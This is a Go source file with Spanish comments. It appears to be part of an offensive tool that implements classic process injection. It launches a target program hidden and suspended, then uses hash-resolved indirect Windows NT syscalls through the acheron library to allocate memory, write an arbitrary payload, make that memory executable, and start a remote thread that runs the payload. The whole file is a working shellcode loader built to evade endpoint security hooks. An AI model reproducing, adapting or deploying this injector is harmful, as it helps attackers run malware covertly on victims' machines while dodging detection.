package injection

import (
	"fmt"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

const (
	THREAD_ALL_ACCESS = 0x1FFFFF
)

type ClassicInjector struct {
	acheron *acheron.Acheron
}

func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
	// 1. Crear proceso suspendido usando CreateProcessW (evita errores NT directos)
	cmd, err := windows.UTF16PtrFromString(targetProc)
	if err != nil {
		return fmt.Errorf("error al convertir string: %v", err)
	}

	si := &windows.StartupInfo{
		Flags:      windows.STARTF_USESHOWWINDOW,
		ShowWindow: windows.SW_HIDE,
	}
	pi := &windows.ProcessInformation{}

	err = windows.CreateProcess(
		nil,
		cmd,
		nil, nil,
		false,
		windows.CREATE_SUSPENDED,
		nil, nil,
		si,
		pi,
	)
	if err != nil {
		return fmt.Errorf("error al crear proceso suspendido: %v", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 2. Allocar memoria
	allocHash := i.acheron.HashString("NtAllocateVirtualMemory")
	var baseAddr uintptr
	regionSize := uintptr(len(payload))
	ret, err := i.acheron.Syscall(
		allocHash,
		uintptr(pi.Process),                    // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddr)),     // BaseAddress
		0,                                      // ZeroBits
		uintptr(unsafe.Pointer(&regionSize)),   // RegionSize
		windows.MEM_COMMIT|windows.MEM_RESERVE, // AllocationType
		windows.PAGE_READWRITE,                 // Protect
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("error al allocar memoria: %v", err)
	}

	// 3. Escribir payload
	writeHash := i.acheron.HashString("NtWriteVirtualMemory")
	var bytesWritten uintptr
	ret, err = i.acheron.Syscall(
		writeHash,
		uintptr(pi.Process),
		baseAddr,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret != 0 || err != nil || bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("error al escribir memoria: %v", err)
	}

	// 4. Cambiar permisos a PAGE_EXECUTE_READ
	protectHash := i.acheron.HashString("NtProtectVirtualMemory")
	var oldProtect uint32
	ret, err = i.acheron.Syscall(
		protectHash,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("error al cambiar permisos: %v", err)
	}

	// 5. Crear hilo remoto
	var threadHandle windows.Handle
	createThreadHash := i.acheron.HashString("NtCreateThreadEx")
	ret, err = i.acheron.Syscall(
		createThreadHash,
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0,
		uintptr(pi.Process),
		baseAddr,
		0, 0, 0, 0, 0, 0,
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("error al crear hilo remoto: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	return nil
}
